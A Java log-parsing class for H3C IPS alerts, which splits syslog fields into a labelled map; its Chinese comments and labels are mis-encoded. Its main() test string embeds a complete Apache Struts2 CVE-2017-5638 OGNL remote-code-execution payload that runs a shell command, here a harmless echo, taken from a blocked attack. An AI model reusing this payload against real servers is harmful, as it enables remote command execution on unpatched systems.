package src.utils;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class dealString {
    //ԭ����
    public String originaldata="";
    //ԭ����ȥ��payload
    public String originalDelPayload="";
    //payload
    public String payload="";
    //ͷ����Ϣ
    public String head="";
    public LinkedHashMap<String, String> map = new LinkedHashMap<String, String>();
    public LinkedHashMap<String,String> resultmap=new LinkedHashMap<String,String>();


    //hashmap������Ľ���
    public dealString(String originaldata){
        this.originaldata=originaldata;
        //��ʼ��map
        map.put("Protocol","Э�飺");
        map.put("Application","Ӧ��/����");
        map.put("SrcIPAddr","ԴIP��ַ��");
        map.put("SrcPort","Դ�˿ڣ�");
        map.put("DstIPAddr","Ŀ��IP��ַ��");
        map.put("DstPort","Ŀ�Ķ˿ڣ�");
        map.put("RcvVPNInstance","ԴVPN��ַ��");
        map.put("SrcZoneName","Դ��ȫ��");
        map.put("DstZoneName","Ŀ�İ�ȫ��");
        map.put("UserName","�û�����");
        map.put("PolicyName","ƥ���������");
        map.put("AttackName","�������ƣ�");
        map.put("AttackID","ƥ������ID��");
        map.put("Category","�������ͣ�");
        map.put("Protection","�������ͣ�");
        map.put("SubProtection","���������ͣ�");
        map.put("Severity","���س̶ȣ�");
        map.put("Action","������");
        map.put("CVE","CVE��ţ�");
        map.put("BID","BID��ţ�");
        map.put("MSB","MSB��ţ�");
        map.put("HitDirection","���б��ķ���");
        map.put("RealSrcIP","��ʵԴIP��");
        map.put("SubCategory","���������ͣ�");
        map.put("LoginUserName","��¼�û�����");
        map.put("LoginPwd","��¼���룺");
        map.put("CapturePktName","�����İ�����");
        map.put("HttpHost","HTTP������");
        map.put("HttpFirstLine","HTTPͷ��");
        map.put("SrcMacAddr","ԴMAC��ַ��");
        map.put("DstMacAddr","Ŀ��MAC��ַ��");
        map.put("RealSrcMacAddr","��ʵԴMAC��ַ��");
        map.put("RealDstMacAddr","��ʵĿ��MAC��ַ��");
        map.put("PayLoad","�����غɣ�");
        //ƥ�䵽payload�ַ������ŵ�resultmap��
        Pattern pattern = Pattern.compile("PayLoad.*?$");
        Matcher matcher = pattern.matcher(this.originaldata);
        if (matcher.find()) {
            payload = matcher.group();
        }
        //payload�ַ�����ɿ��ַ���
        originalDelPayload=this.originaldata.replace(payload,"");
        //�÷ֺŷָ��ַ���
        String result[]=this.originalDelPayload.split(";");
        head=result[0];
        result[0]="";
        result=removeEmptyStrings(result);
        /*for (String tt:result
             ) {System.out.println(tt);

        }*/
        resultmap=resultINmap(result,resultmap,map);
        resultmap.put(map.get("PayLoad"),payload);
       /*for (String key : resultmap.keySet()) {
            String value = resultmap.get(key);
            System.out.println("Key = " + key + ", Value = " + value);
        }*/

    }

    //ȥ�������п��ַ���
    public static String[] removeEmptyStrings(String[] arr) {
        List<String> list = new ArrayList<>();
        for (String s : arr) {
            if (!s.trim().isEmpty()) {
                list.add(s);
            }
        }
        return list.toArray(new String[0]);
    }

    public static void showarr(String arr[]){
        for (String s:arr) {
            System.out.println(s);
        }
    }

    //��ȥpayload��ͷ�������map����Ӧ����
    public static LinkedHashMap<String, String> resultINmap(String s[], LinkedHashMap<String,String> resultmap, LinkedHashMap<String,String> map){
        for (String tmp:s) {
            Pattern pattern = Pattern.compile("^(.*?)\\(");
            Matcher matcher = pattern.matcher(tmp);
            if (matcher.find()) {
                String result = matcher.group(1);
                //ƥ�䵽��result��key��map���ҵ����ģ������ĺ��ַ���tmpһ�����resultmap
                //System.out.println("ƥ�䵽��ֵ��"+result+"####"+"����"+map.get(result.trim())+"ֵ��"+tmp);
                resultmap.put(map.get(result.trim()),tmp);
                //System.out.println(result);  // ���
            }

        }
        return resultmap;
    }

    public static void main(String[] args){
        String s="<188> Mar 03 04:08:18 2023 H3C %%10 SN:219801A2N89211Q0008N IPS/4/IPS_IPV4_INTERZONE: Protocol(1001)=TCP; Application(1002)=http; SrcIPAddr(1003)=192.168.1.171; SrcPort(1004)=55948; DstIPAddr(1007)=218.22.191.26; DstPort(1008)=80; RcvVPNInstance(1042)=; SrcZoneName(1025)=Trust; DstZoneName(1035)=Untrust; UserName(1113)=192.168.1.171; PolicyName(1079)=ips; AttackName(1088)=CVE-2017-5638 Apache Struts2 S2-046 Զ������ִ��©��; AttackID(1089)=32374; Category(1090)=©��; Protection(1091)=WebServer; SubProtection(1092)=Apache; Severity(1087)=CRITICAL; Action(1053)=Reset & Logging; CVE(1075)=CVE-2017-5638; BID(1076)=BID-96729; MSB(1077)=--; HitDirection(1115)=original; RealSrcIP(1100)=; SubCategory(1124)=����ע��; LoginUserName(1177)=; LoginPwd(1178)=; CapturePktName(1116)=; HttpHost(1117)=; HttpFirstLine(1118)=; PayLoad(1135)=-----------------------------735323031399963166993862150\\0d\\0aContent-Disposition: form-data; name=\"wdlgwctu\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo mkguufsdterwvnlmohadxzrtgpoeinnabqpexguqatcnjozvrugcsdtrzdoj').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\00b\"\\0d\\0aContent-Type: text/;";
        dealString deal=new dealString(s);
        System.out.println("##################");
        for (String key : deal.resultmap.keySet()) {
            String value = deal.resultmap.get(key);
            System.out.println("Key = " + key + ", Value = " + value);
        }
    }

}
